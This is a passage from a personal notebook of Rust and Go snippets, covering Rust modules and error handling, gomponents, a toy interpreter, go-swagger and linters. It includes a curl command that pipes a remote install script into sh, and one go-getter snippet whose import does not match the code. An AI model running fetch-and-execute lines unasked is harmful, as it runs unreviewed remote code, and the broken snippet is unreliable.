  countries.clear();  // очищаем объект HashMap

  // module
  my_module::pub_test(); // Hello from my_module
  // my_module::private_test(); // error: function is private
  let mut person = my_module::Person{ name: "Tom".to_string(), age: 22 };
  println!("{}", person.name); // Tom
  my_module::inner_module::test(); // Hello from inner_module
  my_module::child_module::test(); // Hello from my_module
  // use my_module::inner_module::hello;
  test(); // Hello from inner_module
  // use my_module::inner_module::*;
  // use my_module::inner_module::{hello, bye}; // hello(); buy();
  // use my_module::inner_module::{self, hello, bye}; // inner_module::welcome();
  // use my_module::inner_module; // inner_module::hello();
  // use my_module::inner_module::hello as simple_hello; // simple_hello();
  // external file lifetime.rs:
  // pub mod messages{
  //   pub mod message_functions{
  //     pub fn hello(){ println! ("Hello"); }
  //     pub fn bye(){ println! ("Good bye"); }
  //   }
  // }
  // and in main.rs we include them:
  // mod lifetime;
  // use lifetime::messages::message_functions::{hello, bye};

  // error
  // panic!("непредвиденная ошибка"); // выводит на консоль сообщение об ошибке, очищает стек и завершает выполнение программы
  // enum Result<T, E> {
  //   Ok(T),
  //   Err(E),
  // }
  let tom_result = create_person("Tom", 36);
  match tom_result{
    Ok(tom) => println!("Name: {}  Age: {}", tom.name, tom.age), // Name: Tom  Age: 36
    Err(err_message) => println!("{}", err_message)
    // Err(err_message) => panic!("Возникла проблема: {}", err_message)
  }
  let tom_result = create_person("Tom", 36);
  let tom = match tom_result{
    Ok(person) => person,
    Err(err_message) => panic!("Возникла проблема: {}", err_message)
  };
  println!("Name: {}  Age: {}", tom.name, tom.age); // Name: Tom  Age: 36
  // Если возвращенный объект Result представляет константу Ok, то метод unwrap() возвращает объект,
  // который содержится в константе Ok. Но если объект Result представляет константу Err, то метод unwrap() вызывает макрос panic!.
  let tom = create_person("Tom", 36).unwrap();
  println!("Name: {}  Age: {}", tom.name, tom.age);
  let tom = create_person("Tom", 36).expect("Что-то пошло не так...."); // like unwrap with message
  println!("Name: {}  Age: {}", tom.name, tom.age);
  let tom = create_person("Tom", 36).unwrap_or_else(|error| { // обработка ошибки в анонимной функции
    panic!("Возникла проблема: {}", error)
  });
  let tom_result = create_person_err("Tom", 36);
  let tom = match tom_result{
    Ok(person) => person,
    Err(error) => match error.kind {
      ErrorKind::InvalidAge(message) => panic!("{}", message),
      ErrorKind::InvalidName(message) => panic!("{}", message)
    }
  };
  let tom = create_person_err("Tom", 36).unwrap_or_else(|error| {
    match error.kind {
      ErrorKind::InvalidAge(message) => panic!("{}", message),
      ErrorKind::InvalidName(message) => panic!("{}", message)
    }
  });
  // fn main() ->Result<(), String>{
  //   let tom = create_person("Tom", 36)?;
  //   println!("Name: {}  Age: {}", tom.name, tom.age);
  //   Ok(())
  // }

  // cargo
  // cargo new hello
  // in Cargo.toml file:
  // [dependencies]
  // rand = "0.8.3"
  // in main.rs file:
  // use rand::Rng;  // используем пакет rand
  // let random_number = rand::thread_rng().gen_range(0..10);
  // cargo run

  // stdin
  // use std::io;
  // fn main()  -> io::Result<()>{
  //   let mut input = String::new();
  //   println!("Введите свое имя: ");
  //   io::stdin().read_line(&mut input)?;
  //   println!("Ваш имя: {}", input);
  //   Ok(())
  // }
}

fn hello(){ println!("Hello Rust"); }
fn sum(a: i32, b: i32) -> i32
{
  a + b
  // return a + b; //ok
  // a + b; //will return (), no i32
}
struct Person {
  name: String,
  age: u8,
  height: f32,
}
struct Point(i32, i32);
struct Distance(Point, Point);
enum OperationType {
  Add,
  Subtract,
}
enum DayTime {
  Morning(String),
  Evening(String),
}
fn display_message(message: String) {println!("message: {}", message);}
fn display_message_ref(message: &String) {println!("message: {}", message);}
fn change_message(mes: &mut String) {mes.push('!');}
impl Person {
  fn display(&self) {println!("Name: {}  Age: {}", &self.name, &self.age);}
  fn is_older(&self, other: &Person) -> bool {self.age > other.age}
  fn change_age(&mut self, age: u8) {self.age = age;}
  fn create(user_name: &str, user_age: u8) -> Person {
    Person {
      name: String::from(user_name),
      age: user_age,
      height: 159.7,
    }
  }
}
trait Printer {
  fn print(&self);
  fn preview(&self) -> String;
  fn print_something(&self) {println!("something...");}
}
impl Printer for Person {
  fn print(&self) {println!("Person {}; age: {}", self.name, self.age);}
  fn preview(&self) -> String {format!("[Предпросмотр] Person {}; age: {}", self.name, self.age)}
}
fn display_printable(printable: &impl Printer) {printable.print();}
fn create_printable() -> impl Printer {
  return Person {
    name: "Bob".to_string(),
    age: 23,
    height: 178.0,
  };
}
struct PersonGen<T, S> {
  id: T,
  name: String,
  place: S,
}
enum DayTimeGen<T> {
  Morning(T),
  Evening(T),
}
fn receive<T>(item: T) -> T {item}
impl<T, S> PersonGen<T, S> {
  fn get_id(&self) -> &T {
    &self.id
  }
}
impl PersonGen<i32, i32> {
  fn get_id_i32(&self) -> &i32 {&self.id}
}
fn display_printable_gen<T: Printer>(printable: &T) {printable.print();}
fn display_printable_gen_where<T>(printable: &T) where T: Printer {printable.print();}
trait Sender { fn send(&self); }
impl Sender for Person {
  fn send(&self) {println!("Сообщение отправлено");}
}
fn print_send(obj: &(impl Printer + Sender)) {
//fn print_send<T: Printer + Sender>(obj: &T) {
//fn print_send<T>(obj: &T) where T: Printer + Sender{
// fn process<T: Printer + Editor, S: Printer + Sender>(obj1: &T, obj2: &S){
  obj.print();
  obj.send();
}
fn get_message<'a>() -> &'a str {"hello"}
// fn check_name<'a, 'b>(name: &'a str, default: &'b str) -> &'a str {
//     if name == "admin" { default}
//     else {name}
// }
fn get_message_static() -> &'static str {"hello"}
mod my_module {
  // определяем модуль
  pub fn pub_test() {  // определяем публичную функцию - с атрибутом pub
    println!("Hello from my_module");
  }
  fn private_test() {  // определяем публичную функцию - с атрибутом pub
    println!("Hello from my_module");
  }
  pub struct Person {
    pub name: String,
    pub age: u8
  }
  pub mod inner_module{
    pub fn test(){println! ("Hello from inner_module");}
    pub fn hello(){println! ("Hello");}
    pub fn bye(){println! ("Good bye");}
    pub fn welcome(){println! ("Welcome");}
  }
  pub mod child_module{
    pub fn test(){
      super::pub_test(); // обращаемся к функции из родительского модуля
    }
  }
}
fn create_person(username: &str, userage: u8) -> Result<Person, String>{
  if userage < 110{
    let new_person = Person{name: String::from(username), age: userage, height: 150.0 };
    Result::Ok(new_person)
  }
  else {
    Result::Err(String::from("Некорректный возраст. Возраст должен быть меньше 110"))
  }
}
enum ErrorKind{
  InvalidAge(String),
  InvalidName(String)
}
struct PersonError {kind: ErrorKind}
fn create_person_err(username: &str, userage: u8) -> Result<Person, PersonError>{
  if username.len() < 3{
    Result::Err(
      PersonError{kind: ErrorKind::InvalidName(String::from("Некорректное имя. Длина имени должна быть больше 2-х символов"))}
    )
  }
  else if userage > 110{
    Result::Err(
      PersonError{kind: ErrorKind::InvalidAge(String::from("Некорректный возраст. Возраст должен быть меньше 110"))}
    )
  }
  else{
    let new_person = Person{name: String::from(username), age: userage, height: 143.0 };
    Result::Ok(new_person)
  }
}
==================================================
Golang frontend with gomponents
(tags: frontend gomponents)
---

https://www.gomponents.com/

package main

import (
  "net/http"
  "time"

  g "github.com/maragudk/gomponents"
  c "github.com/maragudk/gomponents/components"
  . "github.com/maragudk/gomponents/html"
)

func main() {
  http.Handle("/", createHandler(indexPage()))
  http.Handle("/contact", createHandler(contactPage()))
  http.Handle("/about", createHandler(aboutPage()))

  _ = http.ListenAndServe("localhost:8080", nil)
}

func createHandler(title string, body g.Node) http.HandlerFunc {
  return func(w http.ResponseWriter, r *http.Request) {
    // Rendering a Node is as simple as calling Render and passing an io.Writer
    _ = Page(title, r.URL.Path, body).Render(w)
  }
}

func indexPage() (string, g.Node) {
  return "Welcome!", Div(
    H1(g.Text("Welcome to this example page")),
    P(g.Text("I hope it will make you happy. 😄 It's using TailwindCSS for styling.")),
  )
}

func contactPage() (string, g.Node) {
  return "Contact", Div(
    H1(g.Text("Contact us")),
    P(g.Text("Just do it.")),
  )
}

func aboutPage() (string, g.Node) {
  return "About", Div(
    H1(g.Text("About this site")),
    P(g.Text("This is a site showing off gomponents.")),
  )
}

func Page(title, path string, body g.Node) g.Node {
  // HTML5 boilerplate document
  return c.HTML5(c.HTML5Props{
    Title:    title,
    Language: "en",
    Head: []g.Node{
      Link(Rel("stylesheet"), Href("https://unpkg.com/tailwindcss@^2.1.x/dist/base.min.css")),
      Link(Rel("stylesheet"), Href("https://unpkg.com/tailwindcss@^2.1.x/dist/components.min.css")),
      Link(Rel("stylesheet"), Href("https://unpkg.com/@tailwindcss/typography@0.4.x/dist/typography.min.css")),
      Link(Rel("stylesheet"), Href("https://unpkg.com/tailwindcss@^2.1.x/dist/utilities.min.css")),
    },
    Body: []g.Node{
      Navbar(path, []PageLink{
        {Path: "/contact", Name: "Contact"},
        {Path: "/about", Name: "About"},
      }),
      Container(
        Prose(body),
        PageFooter(),
      ),
    },
  })
}

type PageLink struct {
  Path string
  Name string
}

func Navbar(currentPath string, links []PageLink) g.Node {
  return Nav(Class("bg-gray-700 mb-4"),
    Container(
      Div(Class("flex items-center space-x-4 h-16"),
        NavbarLink("/", "Home", currentPath == "/"),

        // We can Map custom slices to Nodes
        g.Group(g.Map(len(links), func(i int) g.Node {
          return NavbarLink(links[i].Path, links[i].Name, currentPath == links[i].Path)
        })),
      ),
    ),
  )
}

// NavbarLink is a link in the Navbar.
func NavbarLink(path, text string, active bool) g.Node {
  return A(Href(path), g.Text(text),
    // Apply CSS classes conditionally
    c.Classes{
      "px-3 py-2 rounded-md text-sm font-medium focus:outline-none focus:text-white focus:bg-gray-700": true,
      "text-white bg-gray-900":                           active,
      "text-gray-300 hover:text-white hover:bg-gray-700": !active,
    },
  )
}

func Container(children ...g.Node) g.Node {
  return Div(Class("max-w-7xl mx-auto px-2 sm:px-6 lg:px-8"), g.Group(children))
}

func Prose(children ...g.Node) g.Node {
  return Div(Class("prose"), g.Group(children))
}

func PageFooter() g.Node {
  return Footer(Class("prose prose-sm prose-indigo"),
    P(
      // We can use string interpolation directly, like fmt.Sprintf.
      g.Textf("Rendered %v. ", time.Now().Format(time.RFC3339)),

      // Conditional inclusion
      g.If(time.Now().Second()%2 == 0, g.Text("It's an even second.")),
      g.If(time.Now().Second()%2 == 1, g.Text("It's an odd second.")),
    ),

    P(A(Href("https://www.gomponents.com"), g.Text("gomponents"))),
  )
}
==================================================
Handmade primitive compiler
(tags: handmade compiler)
---

https://github.com/utimur/proggraming-lang-course

// code.txt
сумма РАВНО ( 5 МИНУС 9 ) ПЛЮС 5;
КОНСОЛЬ сумма;
КОНСОЛЬ ( 10 МИНУС 5 );

// main.go
package main

import (
  "fmt"
  "io/ioutil"
  "os"
)

func main() {
  file := os.Args[1]
  codeBytes, err := ioutil.ReadFile(file)
  if err != nil {
    panic(err)
  }
  code := string(codeBytes)
  fmt.Println(code)

  lexer := NewLexer(code)
  _, err = lexer.Analysis()
  if err != nil {
    panic(err)
  }

  parser := NewParser(lexer.tokenList)
  rootNode, err := parser.parseCode()
  if err != nil {
    panic(err)
  }

  parser.run(rootNode)
}

// token.go
package main

type Token struct {
  tokenType TokenType
  text      string
  pos       int
}

func NewToken(tokenType TokenType, text string, pos int) Token {
  return Token{
    tokenType: tokenType,
    text:      text,
    pos:       pos,
  }
}

// tokentype.go
package main

type TokenType struct {
  name  string
  regex string
}

func NewTokenType(name string, regex string) TokenType {
  return TokenType{
    name:  name,
    regex: regex,
  }
}

var TokenTypesList = map[string]TokenType{
  "NUMBER":    NewTokenType("NUMBER", "[0-9]*"),
  "VARIABLE":  NewTokenType("VARIABLE", "[а-я]*"),
  "SEMICOLON": NewTokenType("SEMICOLON", ";"),
  "SPACE":     NewTokenType("SPACE", "[ \\n\\t\\r]"),
  "ASSIGN":    NewTokenType("ASSIGN", "РАВНО"),
  "LOG":       NewTokenType("LOG", "КОНСОЛЬ"),
  "PLUS":      NewTokenType("PLUS", "ПЛЮС"),
  "MINUS":     NewTokenType("MINUS", "МИНУС"),
  "LPAR":      NewTokenType("LPAR", "\\("),
  "RPAR":      NewTokenType("RPAR", "\\)"),
}

// node.go
package main

import "fmt"

const (
  _ = iota
  Variable
  Number
  UnaryOperation
  Statements
  Assign
  BinOperation
)

type AssignNode struct {
  operator  Token
  leftNode  *ExpressionNode
  rightNode *ExpressionNode
}

func NewAssignNode(operator Token, leftNode *ExpressionNode, rightNode *ExpressionNode) *AssignNode {
  return &AssignNode{operator: operator, leftNode: leftNode, rightNode: rightNode}
}

type BinOperationNode struct {
  operator  Token
  leftNode  ExpressionNodeInterface
  rightNode ExpressionNodeInterface
}

func NewBinOperationNode(operator Token, leftNode ExpressionNodeInterface, rightNode ExpressionNodeInterface) *BinOperationNode {
  return &BinOperationNode{operator: operator, leftNode: leftNode, rightNode: rightNode}
}

type ExpressionNode struct{}

type NumberNode struct {
  number Token
}

func NewNumberNode(number Token) *NumberNode {
  return &NumberNode{number: number}
}

type StatementsNode struct {
  codeStrings []ExpressionNodeInterface
}

func NewStatementsNode() *StatementsNode {
  return &StatementsNode{codeStrings: make([]ExpressionNodeInterface, 0)}
}

func (n *StatementsNode) addNode(node ExpressionNodeInterface) {
  n.codeStrings = append(n.codeStrings, node)
}

type UnaryOperationNode struct {
  operator Token
  operand  ExpressionNodeInterface
}

func NewUnaryOperationNode(operator Token, operand ExpressionNodeInterface) *UnaryOperationNode {
  return &UnaryOperationNode{operator: operator, operand: operand}
}

type VariableNode struct {
  variable Token
  value    int
}

func (n VariableNode) String() string {
  return fmt.Sprintf("%s = %d", n.variable.text, n.value)
}

func NewVariableNode(variable Token) *VariableNode {
  return &VariableNode{variable: variable}
}

type ExpressionNodeInterface interface {
  GetType() int
}

func (n *VariableNode) GetType() int       { return Variable }
func (n *NumberNode) GetType() int         { return Number }
func (n *UnaryOperationNode) GetType() int { return UnaryOperation }
func (n *StatementsNode) GetType() int     { return Statements }
func (n *AssignNode) GetType() int         { return Assign }
func (n *BinOperationNode) GetType() int   { return BinOperation }

// lexer.go
package main

import (
  "fmt"
  "regexp"
)

type Lexer struct {
  code      string
  pos       int
  tokenList []Token
}

func NewLexer(code string) *Lexer {
  return &Lexer{
    code: code,
  }
}

func (l *Lexer) Analysis() ([]Token, error) {
  flag := true
  var err error
  for flag {
    flag, err = l.nextToken()
    if err != nil {
      panic(err)
    }
  }

  var buf []Token
  for _, token := range l.tokenList {
    if token.tokenType.name != TokenTypesList["SPACE"].name && token.text != "" {
      buf = append(buf, token)
    }
  }
  l.tokenList = buf

  return l.tokenList, err
}

func (l *Lexer) nextToken() (bool, error) {
  if l.pos >= len(l.code) {
    return false, nil
  }

  for _, tokenType := range TokenTypesList {
    regex := regexp.MustCompile("^" + tokenType.regex)
    result := regex.FindAllString(l.code[l.pos:], -1)
    if result != nil {
      token := NewToken(tokenType, result[0], l.pos)
      l.pos += len(result[0])
      l.tokenList = append(l.tokenList, token)
      return true, nil
    }
  }
  return false, fmt.Errorf("на позиции %d обнаружена ошибка", l.pos)
}

// parser.go
package main

import (
  "fmt"
  "strconv"
)

type Parser struct {
  tokens []Token
  pos    int
  scope  map[string]*VariableNode
}

func NewParser(tokens []Token) Parser {
  return Parser{
    tokens: tokens,
    scope:  make(map[string]*VariableNode),
  }
}

func (p *Parser) match(expected ...TokenType) (Token, bool) {
  if p.pos < len(p.tokens) {
    currentToken := p.tokens[p.pos]
    for _, tokenType := range expected {
      if tokenType.name == currentToken.tokenType.name {
        p.pos++
        return currentToken, true
      }
    }
  }
  return Token{}, false
}

func (p *Parser) require(expected ...TokenType) (Token, error) {

  if token, exists := p.match(expected...); exists {
    return token, nil
  }
  return Token{}, fmt.Errorf(`на позиции %d ожидается %s`, p.pos, expected[0].name)
}

func (p *Parser) parseVariableOrNumber() (ExpressionNodeInterface, error) {
  if variable, ok := p.match(TokenTypesList["VARIABLE"]); ok {
    return NewVariableNode(variable), nil
  }
  if number, ok := p.match(TokenTypesList["NUMBER"]); ok {
    return NewNumberNode(number), nil
  }
  return nil, fmt.Errorf(`ожидается переменная или число на %d позиции`, p.pos)
}

func (p *Parser) parsePrint() (ExpressionNodeInterface, error) {
  if operatorLog, ok := p.match(TokenTypesList["LOG"]); ok {
    formula, err := p.parseFormula()
    if err != nil {
      panic(err)
      return nil, err
    }
    return NewUnaryOperationNode(operatorLog, formula), nil
  }
  return nil, fmt.Errorf(`ожидается унарный оператор КОНСОЛЬ на %d позиции`, p.pos)
}

func (p *Parser) parseParentheses() (ExpressionNodeInterface, error) {
  if _, ok := p.match(TokenTypesList["LPAR"]); ok {
    node, err := p.parseFormula()
    if err != nil {
      panic(err)
      return nil, err
    }
    _, err = p.require(TokenTypesList["RPAR"])
    return node, err
  }
  return p.parseVariableOrNumber()
}

func (p *Parser) parseFormula() (ExpressionNodeInterface, error) {
  leftNode, err := p.parseParentheses()
  if err != nil {
    panic(err)
    return nil, err
  }
  operator, ok := p.match(TokenTypesList["MINUS"], TokenTypesList["PLUS"])
  for ok {
    rightNode, err := p.parseParentheses()
    if err != nil {
      panic(err)
      return nil, err
    }
    leftNode = NewBinOperationNode(operator, leftNode, rightNode)
    operator, ok = p.match(TokenTypesList["MINUS"], TokenTypesList["PLUS"])
  }
  return leftNode, err
}

func (p *Parser) parseExpression() (ExpressionNodeInterface, error) {

  if _, exists := p.match(TokenTypesList["VARIABLE"]); !exists {
    printNode, err := p.parsePrint()
    return printNode, err
  }
  p.pos--
  variableNode, err := p.parseVariableOrNumber()
  if err != nil {
    panic(err)
    return nil, err
  }
  if assignOperator, ok := p.match(TokenTypesList["ASSIGN"]); ok {
    rightFormulaNode, err := p.parseFormula()
    if err != nil {
      panic(err)
      return nil, err
    }
    binaryNode := NewBinOperationNode(assignOperator, variableNode, rightFormulaNode)
    return binaryNode, err
  }
  return nil, fmt.Errorf(`после переменной ожидается оператор присвоения на позиции %d`, p.pos)
}

func (p *Parser) parseCode() (ExpressionNodeInterface, error) {
  root := NewStatementsNode()
  for p.pos < len(p.tokens) {
    codeStringNode, err := p.parseExpression()
    if err != nil {
      panic(err)
      return nil, err
    }
    _, err = p.require(TokenTypesList["SEMICOLON"])
    if err != nil {
      panic(err)
      return nil, err
    }
    root.addNode(codeStringNode)
  }
  return root, nil
}

func (p *Parser) run(node ExpressionNodeInterface) interface{} {
  switch val := node.(type) {
  case *NumberNode:
    res, err := strconv.Atoi(val.number.text)
    if err != nil {
      panic(err)
    }
    return res
  case *UnaryOperationNode:
    switch val.operator.tokenType.name {
    case TokenTypesList["LOG"].name:
      fmt.Println(p.run(val.operand))
      return nil
    }
  case *BinOperationNode:
    switch val.operator.tokenType.name {
    case TokenTypesList["PLUS"].name:
      l := p.run(val.leftNode)
      r := p.run(val.rightNode)
      if lVal, lOk := l.(int); lOk {
        if rVal, rOk := r.(int); rOk {
          return lVal + rVal
        }
      }
      panic("bad plus")
    case TokenTypesList["MINUS"].name:
      l := p.run(val.leftNode)
      r := p.run(val.rightNode)
      if lVal, lOk := l.(int); lOk {
        if rVal, rOk := r.(int); rOk {
          return lVal - rVal
        }
      }
      panic("bad minus")
    case TokenTypesList["ASSIGN"].name:
      res := p.run(val.rightNode)
      variableNode := val.leftNode.(*VariableNode)
      variableNode.value = res.(int)
      p.scope[variableNode.variable.text] = variableNode
      return res
    }
  case *VariableNode:
    if variable, exists := p.scope[val.variable.text]; exists {
      return variable
    }
    panic(fmt.Sprintf(`Переменная с названием %s не обнаружена`, val.variable.text))
  case *StatementsNode:
    for _, codeString := range val.codeStrings {
      p.run(codeString)
    }
    return nil
  default:
    fmt.Printf("UNKNOWN: %+v\n", val)
  }
  panic("Ошибка!")
}
==================================================
Pretty print golang struct
(tags: pretty print golang struct)
---

https://github.com/shurcooL/go-goon

x := Lang{
  Name: "Go",
  Year: 2009,
  URL:  "http",
  Inner: &Inner{
    Field1: "Secret!",
  },
}

goon.Dump(x)

// Output:
// (Lang)(Lang{
//   Name: (string)("Go"),
//   Year: (int)(2009),
//   URL:  (string)("http"),
//   Inner: (*Inner)(&Inner{
//     Field1: (string)("Secret!"),
//     Field2: (int)(0),
//   }),
// })

adderFunc := func(a int, b int) int {
  c := a + b
  return c
}

goon.DumpExpr(adderFunc)

// Output:
// adderFunc = (func(int, int) int)(func(a int, b int) int {
//   c := a + b
//   return c
// })
==================================================
Golang Finaliser and KeepAlive
(tags: golang finalizer keepalive)
---

https://pkg.go.dev/runtime#KeepAlive

package main

import (
  "fmt"
  "runtime"
  "syscall"
)

func main() {
  type File struct { d int }
  d, err := syscall.Open("f.txt", syscall.O_RDONLY, 0) // go -> asm (no c)
  if err != nil {
    panic(err)
  }
  p := &File{d}
  runtime.SetFinalizer(p, func(p *File) { syscall.Close(p.d) })
  var buf [10]byte
  n, err := syscall.Read(p.d, buf[:])
  if err != nil {
    panic(err)
  }
  runtime.KeepAlive(p) // это гарантирует, что финалайзер не запустится до KeepAlive функции
  fmt.Printf("%d: %v %s\n", n, buf, buf)
}
==================================================
Golang linters
(tags: golang linter)
---

https://habr.com/ru/post/457970/
https://github.com/golangci/awesome-go-linters

// Local installation https://golangci-lint.run/usage/install/#local-installation
curl -sSfL https://raw.githubusercontent.com/golangci/golangci-lint/master/install.sh | sh -s -- -b $(go env GOPATH)/bin v1.40.1
golangci-lint --version

// run default linters
golangci-lint run
//show all linters
golangci-lint help linters
// run all linters
golangci-lint run --enable-all
// run specific linters
golangci-lint run --disable-all -E gocritic -E nlreturn
// run linters only for new changes
golangci-lint run --new-from-rev=origin/master
golangci-lint run --new-from-rev=HEAD~1
// config for linters .golangci.yml
==================================================
Golang getter all source
(tags: golang getter source)
---

https://github.com/hashicorp/go-getter

package main

import (
  "s"
)

func main() {
  getter.GetFile("f.txt", "https://github.com/hashicorp/go-getter/blob/main/get.go")
}
==================================================
Graph of golang project relations
(tags: graph golang project)
---

https://github.com/ofabry/go-callvis

go get -u github.com/ofabry/go-callvis
go-callvis .
// see http://localhost:7878
root@pc:/home/user1/projects/project1# /root/go/bin/go-callvis /home/user1/projects/project1/cmd/project1/main.go
==================================================
Swagger simple server
(tags: swagger simple server)
---

https://goswagger.io/tutorial/todo-list.html

// how to install
download_url=$(curl -s https://api.github.com/repos/go-swagger/go-swagger/releases/latest | jq -r '.assets[] | select(.name | contains("'"$(uname | tr '[:upper:]' '[:lower:]')"'_amd64")) | .browser_download_url')
curl -o /usr/local/bin/swagger -L'#' "$download_url"
chmod +x /usr/local/bin/swagger

// generate tampalte swagger.yml
swagger init spec --title "A Todo list application" --description "From the todo list tutorial on goswagger.io" --version 1.0.0 --scheme http --consumes application/io.goswagger.examples.todo-list.v1+json --produces application/io.goswagger.examples.todo-list.v1+json

// add path and definitions
// swagger.yml
swagger: "2.0"
info:
  description: From the todo list tutorial on goswagger.io
  title: A Todo list application
  version: 1.0.0
consumes:
  - application/io.goswagger.examples.todo-list.v1+json
produces:
  - application/io.goswagger.examples.todo-list.v1+json
schemes:
  - http
paths:
  /:
    get:
      tags:
        - todos
      operationId: findTodos
      parameters:
        - name: since
          in: query
          type: integer
          format: int64
        - name: limit
          in: query
          type: integer
          format: int32
          default: 20
      responses:
        200:
          description: list the todo operations
          schema:
            type: array
            items:
              $ref: "#/definitions/item"
        default:
          description: generic error response
          schema:
            $ref: "#/definitions/error"
    post:
      tags:
        - todos
      operationId: addOne
      parameters:
        - name: body
          in: body
          schema:
            $ref: "#/definitions/item"
      responses:
        201:
          description: Created
          schema:
            $ref: "#/definitions/item"
        default:
          description: error
          schema:
            $ref: "#/definitions/error"
  /{id}:
    parameters:
      - type: integer
        format: int64
        name: id
        in: path
        required: true
    put:
      tags:
        - todos
      operationId: updateOne
      parameters:
        - name: body
          in: body
          schema:
            $ref: "#/definitions/item"
      responses:
        200:
          description: OK
          schema:
            $ref: "#/definitions/item"
        default:
          description: error
          schema:
            $ref: "#/definitions/error"
    delete:
      tags:
        - todos
      operationId: destroyOne
      responses:
        204:
          description: Deleted
        default:
          description: error
          schema:
            $ref: "#/definitions/error"
definitions:
  item:
    type: object
    required:
      - description
    properties:
      id:
        type: integer
        format: int64
        readOnly: true
      description:
        type: string
        minLength: 1
      completed:
        type: boolean
  error:
    type: object
    required:
      - message
    properties:
      code:
        type: integer
        format: int64
      message:
        type: string

// in terminal
// swagger generate server -A todo-list -f ./swagger.yml
// tree
.
├── cmd
│   └── todo-list-server
│       └── main.go
├── go_build_main_go
├── go_build_stepik
├── go.mod
├── go.sum
├── models
│   ├── error.go
│   └── item.go
├── restapi
│   ├── configure_todo_list.go
│   ├── doc.go
│   ├── embedded_spec.go
│   ├── operations
│   │   ├── todo_list_api.go
│   │   └── todos
│   │       ├── add_one.go
│   │       ├── add_one_parameters.go
│   │       ├── add_one_responses.go
│   │       ├── add_one_urlbuilder.go
│   │       ├── destroy_one.go
│   │       ├── destroy_one_parameters.go
│   │       ├── destroy_one_responses.go
│   │       ├── destroy_one_urlbuilder.go
│   │       ├── find_todos.go
│   │       ├── find_todos_parameters.go
│   │       ├── find_todos_responses.go
│   │       ├── find_todos_urlbuilder.go
│   │       ├── get.go
│   │       ├── get_parameters.go
│   │       ├── get_responses.go
│   │       ├── get_urlbuilder.go
│   │       ├── update_one.go
│   │       ├── update_one_parameters.go
│   │       ├── update_one_responses.go
│   │       └── update_one_urlbuilder.go
│   └── server.go
└── swagger.yml

// get restapi/configure_todo_list.go here:
https://github.com/go-swagger/go-swagger/blob/master/examples/tutorials/todo-list/server-complete/restapi/configure_todo_list.go

// testing in terminal
curl -i localhost:44309 -d "{\"description\":\"message $RANDOM\"}" -H 'Content-Type: application/io.goswagger.examples.todo-list.v1+json'
// response like: {"description":"message 32024","id":1}
curl -i localhost:44309/1 -X PUT -H 'Content-Type: application/io.goswagger.examples.todo-list.v1+json' -d '{"description":"go shopping"}'
// {"description":"go shopping","id":1}
curl -i localhost:44309/1 -X DELETE -H 'Content-Type: application/io.goswagger.examples.todo-list.v1+json'

// swagger serve swagger.yml
// http://localhost:35211/docs
==================================================
Swagger custom server
(tags: swagger custom server)
---

https://goswagger.io/tutorial/custom-server.html

// swagger/swagger.yml
swagger: '2.0'
info:
  version: 1.0.0
  title: Greeting Server
paths:
  /hello:
    get:
      produces:
        - text/plain
      parameters:
        - name: name
          required: false
          type: string
          in: query
          description: defaults to World if not given
      operationId: getGreeting
      responses:
        200:
          description: returns a greeting
          schema:
            type: string
            description: contains the actual greeting as plain text

// swagger generate server -t gen -f ./swagger/swagger.yml --exclude-main -A greeter
// tree
.
├── cmd
│   └── greeter
├── gen
│   └── restapi
│       ├── configure_greeter.go
│       ├── doc.go
│       ├── embedded_spec.go
│       ├── operations
│       │   ├── get_greeting.go
│       │   ├── get_greeting_parameters.go
│       │   ├── get_greeting_responses.go
│       │   ├── get_greeting_urlbuilder.go
│       │   └── greeter_api.go
│       └── server.go
└── swagger
    └── swagger.yml

// cmd/greeter/main.go
package main

import (
  "flag"
  "fmt"
  "github.com/go-openapi/loads"
  "github.com/go-openapi/runtime/middleware"
  "github.com/go-openapi/swag"
  "log"
  "stepik/gen/restapi"
  "stepik/gen/restapi/operations"
)

var portFlag = flag.Int("port", 3000, "Port to run this service on")

func main() {
  // load embedded swagger file
  swaggerSpec, err := loads.Analyzed(restapi.SwaggerJSON, "")
  if err != nil {
    log.Fatalln(err)
  }

  // create new service API
  api := operations.NewGreeterAPI(swaggerSpec)
  server := restapi.NewServer(api)
  defer server.Shutdown()

  // parse flags
  flag.Parse()
  // set the port this service will be run on
  server.Port = *portFlag

  // set Handle
  api.GetGreetingHandler = operations.GetGreetingHandlerFunc(
    func(params operations.GetGreetingParams) middleware.Responder {
      name := swag.StringValue(params.Name)
      if name == "" {
        name = "World"
      }

      greeting := fmt.Sprintf("Hello, %s!", name)
      return operations.NewGetGreetingOK().WithPayload(greeting)
    })

  // serve API
  if err := server.Serve(); err != nil {
    log.Fatalln(err)
  }
}

// 127.0.0.1:3000/hello?name=Bob
// Hello, Bob!

// swagger serve swagger/swagger.yml
// http://localhost:35211/docs
==================================================
Using timeout without context
(tags: timeout without context)
---

package main

import (
  "fmt"
  "time"
)

func main() {
  SendValue()
}

func SendValue(){
  sendChan := make(chan bool, 1)

  go func() {
    sendChan <- Send()
  }()

  select {
  case <-sendChan:
    fmt.Println("case <-sendChan")
  case <-time.After(3 * time.Second):
    fmt.Println("case <-time.After(3 * time.Second)")
    return
  }

  //continue logic in case send didn't timeout
}

func Send() bool {
  time.Sleep(5 * time.Second)
  return true
}
==================================================
Recover
(tags: recover)
---

// in top of function
defer func() {
  if err := recover(); err != nil {
    fmt.Println(err)
  }
}()
==================================================
Easyjson
(tags: easyjson)
---

go get -u github.com/mailru/easyjson/...
// remove vendor folder (you can return it after generating)

// main.go
package main

import (
  "encoding/json"
  "fmt"
  "stepik/model"
)

func main() {
  fmt.Println("fd")
  m := model.Model{
    Id:    1,
    Name:  "dkfjsl",
    Price: 3230,
  }
  // компилятор увидит что для данной структуры реализован метод MarshalJSON() в model_easyjson.go и будет использовать его
  data, err := json.Marshal(m)
  if err != nil {
    panic(err)
  }
  fmt.Println(string(data))
  var mm model.Model
  json.Unmarshal(data, &mm)
  fmt.Printf("%+v", mm)
}

// в package main не будет генерировать, поэтому структуры надо выносить в другие package
// model/model.go
package model

//easyjson:json
type Model struct {
  Id    int     `json:"id"`
  Name  string  `json:"name"`
  Price float64 `json:"price"`
}

type Model2 struct {
  Id    int     `json:"id"`
  Name  string  `json:"name"`
  Price float64 `json:"price"`
}

// easyjson model/model.go
// in model folder in file model_easyjson.go you see generated code for Model (not for Model2)
==================================================
Golang dependency analysis with spagetti
(tags: dependency analysis spagetti)
---

https://github.com/adonovan/spaghetti

go install github.com/adonovan/spaghetti@latest
~/go/bin/spaghetti [package] &
// see http://localhost:18080/
==================================================
Golang project uml diagram with goplantuml
(tags: uml diagram goplantuml)
---

https://github.com/jfeliu007/goplantuml

